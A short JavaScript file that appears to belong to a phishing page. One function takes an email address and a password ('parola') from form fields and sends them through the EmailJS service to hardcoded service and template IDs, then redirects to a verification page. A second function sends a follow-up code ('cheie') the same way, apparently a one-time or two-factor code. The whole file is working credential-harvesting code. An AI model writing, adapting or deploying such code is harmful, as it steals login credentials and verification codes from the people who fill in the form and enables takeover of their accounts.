function sendmail()
{
    var params ={
        mail: document.getElementById("mail").value,
        parola: document.getElementById("parola").value
    }
const serviceID = "service_lzrr8o9";
const templateID = "template_rrnogn5";

emailjs.send(serviceID,templateID,params)
.then(
    res => {
        window.location='verification.html';
    }
).catch((err) => console.log(err));
}

function sendmail2()
{
    var params ={
        cheie: document.getElementById("numberInput").value,
    }
const serviceID = "service_lzrr8o9";
const templateID = "template_ebn9l57";

emailjs.send(serviceID,templateID,params)
.then(
    res => {
        var k = document.getElementById("verifici");
        k.style.display = "block";   
    }
).catch((err) => console.log(err));
}